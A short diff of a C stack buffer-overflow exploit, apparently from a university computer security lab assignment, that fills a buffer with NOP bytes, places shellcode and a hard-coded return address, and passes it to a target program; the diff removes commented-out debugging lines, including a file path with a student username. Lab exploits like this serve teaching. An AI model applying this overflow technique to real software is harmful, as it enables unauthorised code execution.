@@ -28,7 +28,6 @@ main ( int argc, char * argv[] )
 	for (i = 0; i < bsize; i++){
 		buff[i] = NOP;
 	}
-	//printf("the size of input is %d\n",strlen(buff));
 
 	ptr = buff + bsize - strlen(shellcode)  - 28;
 	for (i=0; i<strlen(shellcode); i++){
@@ -63,18 +62,8 @@ main ( int argc, char * argv[] )
 	*ptr = 0xa4;
 	ptr++;
 	*ptr = 0x40;
-	//ptr++;
-	//*ptr = 0x00;
 
-/*
-	FILE *fp;
-	fp = fopen("/u/a/wang2213/Desktop/Workspace/ECE568-Computer-Security-Lab/ece568-lab1-2020f/sploits/1.txt","w");
-	for (i=0; i<bsize; i++){
-		fprintf(fp,"%c",buff[i]);
-	}
-	fclose(fp);
-*/
-	//char * s = "\x40\xfd\xa4\x40\x00";
+
 	args[0] = TARGET;
 	args[1] = buff;
 	args[2] = NULL;
